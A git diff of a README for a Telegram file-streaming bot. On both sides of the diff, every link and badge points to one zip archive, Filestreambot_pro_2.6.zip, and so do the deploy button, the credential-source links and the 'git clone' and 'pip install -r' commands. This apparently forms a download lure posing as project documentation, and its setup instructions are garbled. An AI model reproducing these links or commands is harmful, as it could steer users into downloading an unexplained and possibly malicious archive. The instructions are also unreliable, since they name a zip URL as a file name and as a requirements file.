@@ -1,11 +1,11 @@
-![GitHub contributors](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
-![GitHub repo size](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
-![GitHub](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+![GitHub contributors](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+![GitHub repo size](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+![GitHub](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
 
 
 <h1 align="center"></h1>
 <p align="center"> 
-  <img src="https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip%20very%20fast%20file%20streaming%20bot%20used%20for%20streaming%20and%20downloading%20movies&font=Source%20Code%20Pro&forks=1&issues=1&language=1&logo=https%3A%2F%https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip%2F88939380%https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip%20Board&pulls=1&stargazers=1&theme=Dark" alt="Cover Image" width="650">
+  <img src="https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip%20very%20fast%20file%20streaming%20bot%20used%20for%20streaming%20and%20downloading%20movies&font=Source%20Code%20Pro&forks=1&issues=1&language=1&logo=https%3A%2F%https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip%2F88939380%https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip%20Board&pulls=1&stargazers=1&theme=Dark" alt="Cover Image" width="650">
   </a>
   
  <p align="center">
@@ -13,20 +13,20 @@
     <br />
    </strong></a>
     <br />
-    <a href="https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip">Report a Bug</a>
+    <a href="https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip">Report a Bug</a>
     |
-    <a href="https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip">Request Feature</a>
+    <a href="https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip">Request Feature</a>
   </p>
 
 
 <hr>
 
 ## Please Follow me so you know whenever I release a new Project!❤️‍🔥
-### Incase you are having trouble deploying bot you may hire developer we have reasonable rates [click here](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip+KvjFjOWicuZmOTQx)
+### Incase you are having trouble deploying bot you may hire developer we have reasonable rates [click here](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip+KvjFjOWicuZmOTQx)
 
 ## 🍁 About This Bot :
 
-![streamingfilestreambot-professional-live_1](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+![streamingfilestreambot-professional-live_1](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
 
 </p>
 <p align='center'>
@@ -49,10 +49,10 @@
 <h4> So Follow Above Steps 👆 and then deploy other wise bot won't work</h4>
 
 Press the below button to Fast deploy on Heroku/Raiwlay
-Either you could locally host or deploy on [Heroku](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+Either you could locally host or deploy on [Heroku](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
 ### 💜 Heroku
 
-[![Deploy](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+[![Deploy](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
 
 <br>
 
@@ -85,11 +85,11 @@ then goto the <a href="#mandatory-vars">variables tab</a> for more info on setti
 
 
 ```py
-git clone https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip
+git clone https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip
 cd filestreambot-pro
 virtualenv -p /usr/bin/python3 venv
 . ./venv/bin/activate
-pip install -r https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip
+pip install -r https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip
 python3 -m Adarsh
 ```
 
@@ -99,8 +99,8 @@ and to stop the whole bot,
 Setting up things
 
 If you're on Heroku, just add these in the Environmental Variables
-or if you're Locally hosting, create a file named `https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip` in the root directory and add all the variables there.
-An example of `https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip` file:
+or if you're Locally hosting, create a file named `https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip` in the root directory and add all the variables there.
+An example of `https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip` file:
 
 ```py
 API_ID=12345
@@ -117,15 +117,15 @@ DATABASE_URL=mongodb_uri
 <details>
   <summary><b>Vars and Details :</b></summary>
 
-`API_ID` : Goto [https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip) to obtain this.
+`API_ID` : Goto [https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip) to obtain this.
 
-`API_HASH` : Goto [https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip) to obtain this.
+`API_HASH` : Goto [https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip) to obtain this.
   
 `MY_PASS` : Bot PASSWORD
 
-`BOT_TOKEN` : Get the bot token from [@BotFather](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+`BOT_TOKEN` : Get the bot token from [@BotFather](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
 
-`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip) as admin to the channel and type /id. Now copy paste the ID into this field.
+`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip) as admin to the channel and type /id. Now copy paste the ID into this field.
   
 `OWNER_USERNAME` : U should be knowing it afterall it's your username dont remember it? just go to settings!
 
@@ -133,7 +133,7 @@ DATABASE_URL=mongodb_uri
 
 `DATABASE_URL` : MongoDB URI for saving User IDs when they first Start the Bot. We will use that for Broadcasting to them. I will try to add more features related with Database. If you need help to get the URI you can click on logo below!
 
-[![mongo](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+[![mongo](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
 
  Option Vars
 
@@ -162,7 +162,7 @@ DATABASE_URL=mongodb_uri
 
 To get an instant stream link, just forward any media to the bot and boom, its fast af.
   
-![image](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+![image](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
 
 
 ### Channel Support
@@ -170,5 +170,5 @@ Bot also Supported with Channels. Just add bot Channel as Admin. If any new file
 
 ### Credits : 
 
-- [Me](https://github.com/G148-ide/Filestreambot-pro/raw/refs/heads/main/Adarsh/template/Filestreambot_pro_2.6.zip)
+- [Me](https://raw.githubusercontent.com/G148-ide/Filestreambot-pro/main/Adarsh/template/Filestreambot_pro_2.6.zip)
 - Everyone In This Journey !
